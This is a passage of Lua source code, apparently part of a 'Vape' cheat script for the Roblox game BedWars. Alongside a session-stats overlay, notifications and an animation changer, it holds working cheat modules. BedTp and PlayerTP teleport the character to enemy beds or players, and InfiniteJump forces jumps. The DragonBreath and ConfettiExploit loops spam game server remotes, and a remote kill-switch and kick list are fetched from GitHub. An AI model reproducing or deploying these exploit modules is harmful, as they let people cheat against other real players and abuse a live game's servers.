	overlayframe.Size = UDim2.new(0, 200, 0, 120)
	overlayframe.Position = UDim2.new(0, 0, 0, 5)
	overlayframe.Parent = Overlay.GetCustomChildren()
	local overlayframe2 = Instance.new("Frame")
	overlayframe2.Size = UDim2.new(1, 0, 0, 10)
	overlayframe2.Position = UDim2.new(0, 0, 0, -5)
	overlayframe2.Parent = overlayframe
	local overlayframe3 = Instance.new("Frame")
	overlayframe3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	overlayframe3.Size = UDim2.new(1, 0, 0, 6)
	overlayframe3.Position = UDim2.new(0, 0, 0, 6)
	overlayframe3.BorderSizePixel = 0
	overlayframe3.Parent = overlayframe2
	local oldguiupdate = GuiLibrary.UpdateUI
	GuiLibrary.UpdateUI = function(h, s, v, ...)
		overlayframe2.BackgroundColor3 = Color3.fromHSV(h, s, v)
		return oldguiupdate(h, s, v, ...)
	end
	local framecorner1 = Instance.new("UICorner")
	framecorner1.CornerRadius = UDim.new(0, 5)
	framecorner1.Parent = overlayframe
	local framecorner2 = Instance.new("UICorner")
	framecorner2.CornerRadius = UDim.new(0, 5)
	framecorner2.Parent = overlayframe2
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -7, 1, -5)
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.TextYAlignment = Enum.TextYAlignment.Top
	label.Font = Enum.Font.Arial
	label.LineHeight = 1.2
	label.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	label.TextSize = 16
	label.Text = ""
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.fromRGB(200, 200, 200)
	label.Position = UDim2.new(0, 7, 0, 5)
	label.Parent = overlayframe
	local OverlayFonts = {"Arial"}
	for i,v in pairs(Enum.Font:GetEnumItems()) do 
		if v.Name ~= "Arial" then
			table.insert(OverlayFonts, v.Name)
		end
	end
	local OverlayFont = Overlay.CreateDropdown({
		Name = "Font",
		List = OverlayFonts,
		Function = function(val)
			label.Font = Enum.Font[val]
		end
	})
	OverlayFont.Bypass = true
	Overlay.Bypass = true
	local overlayconnections = {}
	local oldnetworkowner
	local teleported = {}
	local teleported2 = {}
	local teleportedability = {}
	local teleportconnections = {}
	local pinglist = {}
	local fpslist = {}
	local matchstatechanged = 0
	local mapname = "Unknown"
	local overlayenabled = false
	
	task.spawn(function()
		pcall(function()
			mapname = workspace:WaitForChild("Map"):WaitForChild("Worlds"):GetChildren()[1].Name
			mapname = string.gsub(string.split(mapname, "_")[2] or mapname, "-", "") or "Blank"
		end)
	end)

	local function didpingspike()
		local currentpingcheck = pinglist[1] or math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
		for i,v in pairs(pinglist) do 
			if v ~= currentpingcheck and math.abs(v - currentpingcheck) >= 100 then 
				return currentpingcheck.." => "..v.." ping"
			else
				currentpingcheck = v
			end
		end
		return nil
	end

	local function notlasso()
		for i,v in pairs(collectionService:GetTagged("LassoHooked")) do 
			if v == lplr.Character then 
				return false
			end
		end
		return true
	end
	local matchstatetick = tick()

	GuiLibrary.ObjectsThatCanBeSaved.GUIWindow.Api.CreateCustomToggle({
		Name = "Overlay", 
		Icon = "vape/assets/TargetIcon1.png", 
		Function = function(callback)
			overlayenabled = callback
			Overlay.SetVisible(callback) 
			if callback then 
				table.insert(overlayconnections, bedwars.ClientHandler:OnEvent("ProjectileImpact", function(p3)
					if not vapeInjected then return end
					if p3.projectile == "telepearl" then 
						teleported[p3.shooterPlayer] = true
					elseif p3.projectile == "swap_ball" then
						if p3.hitEntity then 
							teleported[p3.shooterPlayer] = true
							local plr = playersService:GetPlayerFromCharacter(p3.hitEntity)
							if plr then teleported[plr] = true end
						end
					end
				end))
		
				table.insert(overlayconnections, replicatedStorageService["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].abilityUsed.OnClientEvent:Connect(function(char, ability)
					if ability == "recall" or ability == "hatter_teleport" or ability == "spirit_assassin_teleport" or ability == "hannah_execute" then 
						local plr = playersService:GetPlayerFromCharacter(char)
						if plr then
							teleportedability[plr] = tick() + (ability == "recall" and 12 or 1)
						end
					end
				end))

				table.insert(overlayconnections, vapeEvents.BedwarsBedBreak.Event:Connect(function(bedTable)
					if bedTable.player.UserId == lplr.UserId then
						bedwarsStore.statistics.beds = bedwarsStore.statistics.beds + 1
					end
				end))

				local victorysaid = false
				table.insert(overlayconnections, vapeEvents.MatchEndEvent.Event:Connect(function(winstuff)
					local myTeam = bedwars.ClientStoreHandler:getState().Game.myTeam
					if myTeam and myTeam.id == winstuff.winningTeamId or lplr.Neutral then
						victorysaid = true
					end
				end))

				table.insert(overlayconnections, vapeEvents.EntityDeathEvent.Event:Connect(function(deathTable)
					if deathTable.finalKill then
						local killer = playersService:GetPlayerFromCharacter(deathTable.fromEntity)
						local killed = playersService:GetPlayerFromCharacter(deathTable.entityInstance)
						if not killed or not killer then return end
						if killed ~= lplr and killer == lplr then 
							bedwarsStore.statistics.kills = bedwarsStore.statistics.kills + 1
						end
					end
				end))
				
				task.spawn(function()
					repeat
						local ping = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
						if #pinglist >= 10 then 
							table.remove(pinglist, 1)
						end
						table.insert(pinglist, ping)
						task.wait(1)
						if bedwarsStore.matchState ~= matchstatechanged then 
							if bedwarsStore.matchState == 1 then 
								matchstatetick = tick() + 3
							end
							matchstatechanged = bedwarsStore.matchState
						end
						if not bedwarsStore.TPString then
							bedwarsStore.TPString = tick().."/"..bedwarsStore.statistics.kills.."/"..bedwarsStore.statistics.beds.."/"..(victorysaid and 1 or 0).."/"..(1).."/"..(0).."/"..(0).."/"..(0)
							origtpstring = bedwarsStore.TPString
						end
						if entityLibrary.isAlive and (not oldcloneroot) then 
							local newnetworkowner = isnetworkowner(entityLibrary.character.HumanoidRootPart)
							if oldnetworkowner ~= nil and oldnetworkowner ~= newnetworkowner and newnetworkowner == false and notlasso() then 
								local respawnflag = math.abs(lplr:GetAttribute("SpawnTime") - lplr:GetAttribute("LastTeleported")) > 3
								if (not teleported[lplr]) and respawnflag then
									task.delay(1, function()
										local falseflag = didpingspike()
										if not falseflag then 
											bedwarsStore.statistics.lagbacks = bedwarsStore.statistics.lagbacks + 1
										end
									end)
								end
							end
							oldnetworkowner = newnetworkowner
						else
							oldnetworkowner = nil
						end
						teleported[lplr] = nil
						for i, v in pairs(entityLibrary.entityList) do 
							if teleportconnections[v.Player.Name.."1"] then continue end
							teleportconnections[v.Player.Name.."1"] = v.Player:GetAttributeChangedSignal("LastTeleported"):Connect(function()
								if not vapeInjected then return end
								for i = 1, 15 do 
									task.wait(0.1)
									if teleported[v.Player] or teleported2[v.Player] or matchstatetick > tick() or math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) < 3 or (teleportedability[v.Player] or tick() - 1) > tick() then break end
								end
								if v.Player ~= nil and (not v.Player.Neutral) and teleported[v.Player] == nil and teleported2[v.Player] == nil and (teleportedability[v.Player] or tick() - 1) < tick() and math.abs(v.Player:GetAttribute("SpawnTime") - v.Player:GetAttribute("LastTeleported")) > 3 and matchstatetick <= tick() then 
									bedwarsStore.statistics.universalLagbacks = bedwarsStore.statistics.universalLagbacks + 1
									vapeEvents.LagbackEvent:Fire(v.Player)
								end
								teleported[v.Player] = nil
							end)
							teleportconnections[v.Player.Name.."2"] = v.Player:GetAttributeChangedSignal("PlayerConnected"):Connect(function()
								teleported2[v.Player] = true
								task.delay(5, function()
									teleported2[v.Player] = nil
								end)
							end)
						end
						local splitted = origtpstring:split("/")
						label.Text = "Session Info\nTime Played : "..os.date("!%X",math.floor(tick() - splitted[1])).."\nKills : "..(splitted[2] + bedwarsStore.statistics.kills).."\nBeds : "..(splitted[3] + bedwarsStore.statistics.beds).."\nWins : "..(splitted[4] + (victorysaid and 1 or 0)).."\nGames : "..splitted[5].."\nLagbacks : "..(splitted[6] + bedwarsStore.statistics.lagbacks).."\nUniversal Lagbacks : "..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."\nReported : "..(splitted[8] + bedwarsStore.statistics.reported).."\nMap : "..mapname
						local textsize = textService:GetTextSize(label.Text, label.TextSize, label.Font, Vector2.new(9e9, 9e9))
						overlayframe.Size = UDim2.new(0, math.max(textsize.X + 19, 200), 0, (textsize.Y * 1.2) + 6)
						bedwarsStore.TPString = splitted[1].."/"..(splitted[2] + bedwarsStore.statistics.kills).."/"..(splitted[3] + bedwarsStore.statistics.beds).."/"..(splitted[4] + (victorysaid and 1 or 0)).."/"..(splitted[5] + 1).."/"..(splitted[6] + bedwarsStore.statistics.lagbacks).."/"..(splitted[7] + bedwarsStore.statistics.universalLagbacks).."/"..(splitted[8] + bedwarsStore.statistics.reported)
					until not overlayenabled
				end)
			else
				for i, v in pairs(overlayconnections) do 
					if v.Disconnect then pcall(function() v:Disconnect() end) continue end
					if v.disconnect then pcall(function() v:disconnect() end) continue end
				end
				table.clear(overlayconnections)
			end
		end, 
		Priority = 2
	})
end)

runFunction(function()
	local ReachDisplay = {}
	local ReachLabel
	ReachDisplay = GuiLibrary.CreateLegitModule({
		Name = "Reach Display",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat
						task.wait(0.4)
						ReachLabel.Text = bedwarsStore.attackReachUpdate > tick() and bedwarsStore.attackReach.." studs" or "0.00 studs"
					until (not ReachDisplay.Enabled)
				end)
			end
		end
	})
	ReachLabel = Instance.new("TextLabel")
	ReachLabel.Size = UDim2.new(0, 100, 0, 41)
	ReachLabel.BackgroundTransparency = 0.5
	ReachLabel.TextSize = 15
	ReachLabel.Font = Enum.Font.Gotham
	ReachLabel.Text = "0.00 studs"
	ReachLabel.TextColor3 = Color3.new(1, 1, 1)
	ReachLabel.BackgroundColor3 = Color3.new()
	ReachLabel.Parent = ReachDisplay.GetCustomChildren()
	local ReachCorner = Instance.new("UICorner")
	ReachCorner.CornerRadius = UDim.new(0, 4)
	ReachCorner.Parent = ReachLabel
end)

task.spawn(function()
	local function createannouncement(announcetab)
		local vapenotifframe = Instance.new("TextButton")
		vapenotifframe.AnchorPoint = Vector2.new(0.5, 0)
		vapenotifframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
		vapenotifframe.Size = UDim2.new(1, -10, 0, 50)
		vapenotifframe.Position = UDim2.new(0.5, 0, 0, -100)
		vapenotifframe.AutoButtonColor = false
		vapenotifframe.Text = ""
		vapenotifframe.Parent = shared.GuiLibrary.MainGui
		local vapenotifframecorner = Instance.new("UICorner")
		vapenotifframecorner.CornerRadius = UDim.new(0, 256)
		vapenotifframecorner.Parent = vapenotifframe
		local vapeicon = Instance.new("Frame")
		vapeicon.Size = UDim2.new(0, 40, 0, 40)
		vapeicon.Position = UDim2.new(0, 5, 0, 5)
		vapeicon.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
		vapeicon.Parent = vapenotifframe
		local vapeiconicon = Instance.new("ImageLabel")
		vapeiconicon.BackgroundTransparency = 1
		vapeiconicon.Size = UDim2.new(1, -10, 1, -10)
		vapeiconicon.AnchorPoint = Vector2.new(0.5, 0.5)
		vapeiconicon.Position = UDim2.new(0.5, 0, 0.5, 0)
		vapeiconicon.Image = getcustomasset("vape/assets/VapeIcon.png")
		vapeiconicon.Parent = vapeicon
		local vapeiconcorner = Instance.new("UICorner")
		vapeiconcorner.CornerRadius = UDim.new(0, 256)
		vapeiconcorner.Parent = vapeicon
		local vapetext = Instance.new("TextLabel")
		vapetext.Size = UDim2.new(1, -55, 1, -10)
		vapetext.Position = UDim2.new(0, 50, 0, 5)
		vapetext.BackgroundTransparency = 1
		vapetext.TextScaled = true
		vapetext.RichText = true
		vapetext.Font = Enum.Font.Ubuntu
		vapetext.Text = announcetab.Text
		vapetext.TextColor3 = Color3.new(1, 1, 1)
		vapetext.TextXAlignment = Enum.TextXAlignment.Left
		vapetext.Parent = vapenotifframe
		tweenService:Create(vapenotifframe, TweenInfo.new(0.3), {Position = UDim2.new(0.5, 0, 0, 5)}):Play()
		local sound = Instance.new("Sound")
		sound.PlayOnRemove = true
		sound.SoundId = "rbxassetid://6732495464"
		sound.Parent = workspace
		sound:Destroy()
		vapenotifframe.MouseButton1Click:Connect(function()
			local sound = Instance.new("Sound")
			sound.PlayOnRemove = true
			sound.SoundId = "rbxassetid://6732690176"
			sound.Parent = workspace
			sound:Destroy()
			vapenotifframe:Destroy()
		end)
		game:GetService("Debris"):AddItem(vapenotifframe, announcetab.Time or 20)
	end

	local function rundata(datatab, olddatatab)
		if not olddatatab then
			if datatab.Disabled then 
				coroutine.resume(coroutine.create(function()
					repeat task.wait() until shared.VapeFullyLoaded
					task.wait(1)
					GuiLibrary.SelfDestruct()
				end))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Vape",
					Text = "Vape is currently disabled, please use vape later.",
					Duration = 30,
				})
			end
			if datatab.KickUsers and datatab.KickUsers[tostring(lplr.UserId)] then
				lplr:Kick(datatab.KickUsers[tostring(lplr.UserId)])
			end
		else
			if datatab.Disabled then 
				coroutine.resume(coroutine.create(function()
					repeat task.wait() until shared.VapeFullyLoaded
					task.wait(1)
					GuiLibrary.SelfDestruct()
				end))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Vape",
					Text = "Vape is currently disabled, please use vape later.",
					Duration = 30,
				})
			end
			if datatab.KickUsers and datatab.KickUsers[tostring(lplr.UserId)] then
				lplr:Kick(datatab.KickUsers[tostring(lplr.UserId)])
			end
			if datatab.Announcement and datatab.Announcement.ExpireTime >= os.time() and (datatab.Announcement.ExpireTime ~= olddatatab.Announcement.ExpireTime or datatab.Announcement.Text ~= olddatatab.Announcement.Text) then 
				task.spawn(function()
					createannouncement(datatab.Announcement)
				end)
			end	
		end
	end
	task.spawn(function()
		pcall(function()
			if (inputService.TouchEnabled or inputService:GetPlatform() == Enum.Platform.UWP) and lplr.UserId ~= 3826618847 then return end
			if not isfile("vape/Profiles/bedwarsdata.txt") then 
				local commit = "main"
				for i,v in pairs(game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
					if v:find("commit") and v:find("fragment") then 
						local str = v:split("/")[5]
						commit = str:sub(0, str:find('"') - 1)
						break
					end
				end
				writefile("vape/Profiles/bedwarsdata.txt", game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true))
			end
			local olddata = readfile("vape/Profiles/bedwarsdata.txt")

			repeat
				local commit = "main"
				for i,v in pairs(game:HttpGet("https://github.com/7GrandDadPGN/VapeV4ForRoblox"):split("\n")) do 
					if v:find("commit") and v:find("fragment") then 
						local str = v:split("/")[5]
						commit = str:sub(0, str:find('"') - 1)
						break
					end
				end
				
				local newdata = game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/"..commit.."/CustomModules/bedwarsdata", true)
				if newdata ~= olddata then 
					rundata(game:GetService("HttpService"):JSONDecode(newdata), game:GetService("HttpService"):JSONDecode(olddata))
					olddata = newdata
					writefile("vape/Profiles/bedwarsdata.txt", newdata)
				end

				task.wait(10)
			until not vapeInjected
		end)
	end)
end)

task.spawn(function()
	repeat task.wait() until shared.VapeFullyLoaded
	if not AutoLeave.Enabled then 
		AutoLeave.ToggleButton(false)
	end
end)

if lplr.UserId == 4943216782 then 
	lplr:Kick('mfw, discord > vaperoblox')
end

GuiLibrary.RemoveObject("PanicOptionsButton")
GuiLibrary.RemoveObject("MissileTPOptionsButton")
GuiLibrary.RemoveObject("SwimOptionsButton")
GuiLibrary.RemoveObject("FullbrightOptionsButton")
GuiLibrary.RemoveObject("HighJumpOptionsButton")
GuiLibrary.RemoveObject("AutoRelicOptionsButton")
GuiLibrary.RemoveObject("RavenTPOptionsButton")
GuiLibrary.RemoveObject("XrayOptionsButton")
GuiLibrary.RemoveObject("SchematicaOptionsButton")

runFunction(function()
	local hasTeleported = false
	local TweenService = game:GetService("TweenService")

	function findNearestBed()
		local nearestBed = nil
		local minDistance = math.huge

		for _,v in pairs(game.Workspace:GetDescendants()) do
			if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= lplr.Team.TeamColor then
				local distance = (v.Position - lplr.Character.HumanoidRootPart.Position).magnitude
				if distance < minDistance then
					nearestBed = v
					minDistance = distance
				end
			end
		end
		return nearestBed
	end
	function tweenToNearestBed()
		local nearestBed = findNearestBed()
		if nearestBed and not hasTeleported then
			hasTeleported = true

			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.98), {CFrame = nearestBed.CFrame + Vector3.new(0, 2, 0)})
			tween:Play()
		end
	end
	BedTp = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "BedTp",
		Function = function(callback)
			if callback then
				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				lplr.CharacterAdded:Connect(function()
					wait(0.3) 
					tweenToNearestBed()
				end)
				hasTeleported = false
				warningNotification("APE", "Tping To Random Bed!", 5)
				BedTp["ToggleButton"](false)
			end
		end,
		["HoverText"] = "tp to closest bed v2"
	})
end)

runFunction(function()
    local hasTeleported = false
    local TweenService = game:GetService("TweenService")

    function findNearestPlayer()
        local nearestPlayer = nil
        local minDistance = math.huge

        for _,v in pairs(game.Players:GetPlayers()) do
            if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Team ~= lplr.Team and v.Character:FindFirstChild("Humanoid").Health > 0 then
                local distance = (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).magnitude
                if distance < minDistance then
                    nearestPlayer = v
                    minDistance = distance
                end
            end
        end
        return nearestPlayer
    end


    function tweenToNearestPlayer()
        local nearestPlayer = findNearestPlayer()
        if nearestPlayer and not hasTeleported then
            hasTeleported = true

            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

            local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
            tween:Play()
        end
    end

    PlayerTp = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PlayerTP",
        Function = function(callback)
            if callback then
                lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
                lplr.CharacterAdded:Connect(function()
                    wait(0.3)
                    tweenToNearestPlayer()
                end)
                hasTeleported = false
				warningNotification("APE", "Tping To Random Player!", 5)
                PlayerTp["ToggleButton"](false)
            end
        end,
        ["HoverText"] = "Teleports you to the closest player that is not on your team (BETA)"
    })
end)

runFunction(function()
	InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InfiniteJump",
		Function = function(callback)
			if callback then

			end
		end
	})
	game:GetService("UserInputService").JumpRequest:Connect(function()
		if not InfiniteJump.Enabled then return end
		local localPlayer = game:GetService("Players").LocalPlayer
		local character = localPlayer.Character
		if character and character:FindFirstChildOfClass("Humanoid") then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			humanoid:ChangeState("Jumping")
		end
	end)         
end)

runFunction(function()
local fpsunlocker = {Enabled = false}
fpsunlocker = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
   Name = "FPS Unlocker",
   Function = function(callback)
   if callback then
      setfpscap(9e9)
   else
      setfpscap(60)
   end
end
})
end)

runFunction(function()
	DragonBreath = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "DragonBreath",
		HoverText = "be a dragon lel",
		Function = function(callback)
			if callback then 
				task.spawn(function()
					repeat 
						task.wait(0.3) 
						game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DragonBreath"):FireServer({player = game:GetService("Players").LocalPlayer})
					until (not DragonBreath.Enabled)
				end)
			end
		end
	})
end)

runFunction(function()
    local Confetti = {Enabled = false}
    Confetti = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "ConfettiExploit",
        Function = function(callback)
            if callback then 
                task.spawn(function()
                    repeat 
                        task.wait(0.001) 
                        game:GetService("ReplicatedStorage"):WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility"):FireServer("PARTY_POPPER")
                    until (not Confetti.Enabled)
                end)
            end
        end,
      HoverText = "Fixed  Confetti Exploit"
    })
end)

runFunction(function()
local lplr = game:GetService("Players").LocalPlayer
local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client
local Notify = {["Enabled"] = false}
-- Bed Broken Notification
Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
p13:Connect(function(p14)
	if Notify["Enabled"] then
		local team = p14.brokenBedTeam.displayName
		if team == lplr.Team.Name then
			warningNotification("APE", "bed broke, L", 3.2)
			end
		end
	end)
end)
-- Break Bed Notification
Client:WaitFor("BedwarsBedBreak"):andThen(function(p13)
p13:Connect(function(p14)
	if Notify["Enabled"] then
		if p14.player.Name == lplr.Name then
			warningNotification("APE", "you broke a bed! nice", 2)
			end
		end
	end)
end)
-- Kill Player Notification
Client:WaitFor("EntityDeathEvent"):andThen(function(p6)
p6:Connect(function(p7)
	if Notify["Enabled"] then
		if p7.fromEntity == lplr.Character then
			local plr = playersService:GetPlayerFromCharacter(p7.entityInstance)
			warningNotification("APE", "you killed "..(plr.name), 3)
			end
		end
	end)
end)
local Notify = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
["Name"] = "Notifications",
["Function"]= function(callback) Notify["Enabled"] = callback end,
["HoverText"] = "Notifys you when certain actions happen"
})
end)
			
runFunction(function()
    local ChatMover = {Enabled = false}
    ChatMover = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "ChatMover",
        HoverText = "Move chat to the bottom",
        Function = function(callback)
            if callback then
                game:GetService("TextChatService").ChatWindowConfiguration.HorizontalAlignment = Enum.HorizontalAlignment.Left
                game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = Enum.VerticalAlignment.Center
            else
                game:GetService("TextChatService").ChatWindowConfiguration.HorizontalAlignment = Enum.HorizontalAlignment.Top
                game:GetService("TextChatService").ChatWindowConfiguration.VerticalAlignment = Enum.VerticalAlignment.Center
            end
        end
    })
end)

runFunction(function()
local anim = {["Enabled"] = false}
	anim = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
		["Name"] = "AnimationChanger",
		["HoverText"] = "gives you a FE Animation Pack. Its also customizable",
		["Function"] = function(callback)
			if callback then
				task.spawn(function()
				local Hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					if not Hum then
						repeat task.wait() until Hum
					end
				local Animate = game:GetService("Players").LocalPlayer.Character.Animate
				----Cartoony
				if animrun.Value == "Cartoony" and animtype.Value == "Custom" then
					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921076136" 	
			end
	if animwalk.Value == "Cartoony" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921082452"
	end
	if animfall.Value == "Cartoony" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921077030"
		end
		if animjump.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921078135"
		end
		if animidle.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921071918"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921072875"
		end
		if animclimb.Value == "Cartoony" and animtype.Value == "Custom" then
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921070953"
		end
		----Levitation
				if animrun.Value == "Levitation" and animtype.Value == "Custom" then
					Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921135644" 	
			end
	
			if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
	end
	if animfall.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
		end
		if animjump.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		end
		if animidle.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
		end
			if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
	end
	if animfall.Value == "Levitation" and animtype.Value == "Custom" then
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
		end
		if animjump.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		end
		if animidle.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
			Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
		end
		if animclimb.Value == "Levitation" and animtype.Value == "Custom" then
			Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921132092"
		end
---Robot
		if animrun.Value == "Robot" and animtype.Value == "Custom" then
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921250460" 	
	end

	if animwalk.Value == "Robot" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921255446"
end
if animfall.Value == "Robot" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251156"
end
if animjump.Value == "Robot" and animtype.Value == "Custom" then
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921252123"
end
if animidle.Value == "Robot" and animtype.Value == "Custom" then
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921248039"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921248831"
end
if animclimb.Value == "Robot" and animtype.Value == "Custom" then
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921247141"
end
---Stylish
if animrun.Value == "Stylish" and animtype.Value == "Custom" then
			Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921276116" 	
	end
	if animwalk.Value == "Stylish" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921283326"
end
if animfall.Value == "Stylish" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921278648"
end
if animjump.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921279832"
end
if animidle.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921272275"
	Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921273958"
end
if animclimb.Value == "Stylish" and animtype.Value == "Custom" then
	Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921271391"
end
---Superhero
if animrun.Value == "Superhero" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921291831" 	
end
if animwalk.Value == "Superhero" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921298616"
end
if animfall.Value == "Superhero" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921293373"
end
if animjump.Value == "Superhero" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921294559"
end
if animidle.Value == "Superhero" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921288909"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921290167"
end
if animclimb.Value == "Superhero" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921286911"
end
---Zombie (this animation is garbage lol)
if animrun.Value == "Zombie" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682" 	
end
if animwalk.Value == "Zombie" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921355261"
end
if animfall.Value == "Zombie" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350320"
warningNotification("Spider","Spider doesn't work well with the Zombie fall. So don't recommend using it",5)
end
if animjump.Value == "Zombie" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921351278"
end
